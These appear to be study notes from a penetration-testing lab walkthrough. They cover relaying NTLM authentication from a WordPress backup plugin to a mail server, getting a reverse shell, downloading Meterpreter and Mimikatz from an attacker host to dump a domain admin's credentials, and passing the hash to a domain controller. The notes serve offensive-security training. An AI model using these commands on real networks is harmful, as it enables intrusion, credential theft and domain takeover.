- Based on all of this information, let's define a plan for the second attack vector. First, we'll attempt to force an authentication request by abusing the *Backup directory path* of the Backup Migration WordPress plugin on INTERNALSRV1. By setting the destination path to our Kali machine, we can use **impacket-ntlmrelayx** to relay the incoming connection to MAILSRV1. If our assumptions are correct, the authentication request is made in the context of the local *Administrator* account on INTERNALSRV1, which has the same password as the local *Administrator* account on MAILSRV1.
- If this attack is successful, we'll obtain privileged code execution on MAILSRV1, which we can then leverage to extract the NTLM hash for beccy and therefore, meet one of the primary goals of the penetration test.

Start:
- Let's set up **impacket-ntlmrelayx** before we modify the *Backup directory path* in the WordPress plugin. We'll use **--no-http-server** and **-smb2support** to disable the HTTP server and enable SMB2 support. We'll specify the external address for MAILSRV1, 192.168.50.242, as target for the relay attack. By entering the external address, we don't have to proxy our relay attack via Proxychains. Finally, we'll base64-encode a *PowerShell reverse shell oneliner* that will connect back to our Kali machine on port 9999 and provide it as a command to **-c**.
	- `sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."`
- Set up a Netcat listener on port 9999 for the incoming reverse shell.
	- `nc -lvnp 9999`
- Now with everything set up, we can modify the Backup directory path.
	- Let's set the path to the *URI reference* **//192.168.119.5/test** in which the IP is the address of our Kali machine and **test** is a nonexistent path.
- Success:
	- Listing 73 confirms the assumptions we made earlier. First, INTERNALSRV1/ADMINISTRATOR was used to perform the authentication. Second, by successfully authenticating to MAILSRV1, we confirmed that both machines use the same password for the local Administrator account.
	- The output also states that the relayed command on MAILSRV1 got executed. Let's check our Netcat listener for an incoming reverse shell.
		- `whoami;hostname`
- We successfully obtained code execution as NT AUTHORITY\SYSTEM by authenticating as a local Administrator on MAILSRV1 by relaying an authentication attempt from the WordPress plugin on INTERNALSRV1.

# Gaining Access to the Domain Controller

### Cached Credentials

Scenario:
- As planned, we obtained privileged code execution on MAILSRV1. Our next step is to extract the password hash for the user beccy, which has an active session on this system.
- [Note]:
	- Depending on the objective of the penetration test, we should not skip the local enumeration of the MAILSRV1 system. This could reveal additional vulnerabilities and sensitive information, which we may miss if we directly attempt to extract the NTLM hash for beccy.

Start:
- Once we discover that no AV is running, we should upgrade our shell to Meterpreter. This will not only provide us with a more robust shell environment, but also aid in performing post-exploitation.
- Let's download the previously created Meterpreter reverse shell payload **met.exe** to perform post-exploitation.
	- `cd C:\Users\Administrator
	- `iwr -uri http://192.168.119.5:8000/met.exe -Outfile met.exe`
	- `.\met.exe`
- In Metasploit, we should receive a new incoming session.
- Let's interact with the session and spawn a new PowerShell command line she
	- `sessions -i 2`
	- `shell`
	- `powershell`
- Next, we'll download the current *Mimikatz* version on Kali and serve it via our Python3 web server on port 8000. On MAILSRV1, we'll download Mimikatz with **iwr** and launch it.
	- `iwr -uri http://192.168.119.5:8000/mimikatz.exe -Outfile` 	- `mimikatz.exe`
	- `.\mimikatz.exe`
- Once Mimikatz is launched, we can use **privilege::debug** to obtain *SeDebugPrivilege*. Then, we can use **sekurlsa::logonpasswords** to list all provider credentials available on the system.
	- `privilege::debug`
	- `sekurlsa::logonpasswords`
- We successfully extracted the clear text password and NTLM hash of the domain administrator beccy. Let's store both of them together with the username in **creds.txt** on our Kali system.

### Lateral Movement

Scenario:
- In this section, we'll leverage the domain admin privileges for beccy to get access to the domain controller and therefore, achieve the second goal of the penetration test.

Start:
- Because we've obtained the clear text password and NTLM hash for *beccy*, we can use **impacket-psexec** to get an interactive shell on DCSRV1. While we could use either of them, let's use the NTLM hash. Once we have a command line shell, we confirm that we have privileged access on DCSRV1 (172.16.6.240).
	- `proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:f0397ec5af49971f6efbdb07877046b3 beccy@172.16.6.240`
	- `whoami;hostname;ipconfig`


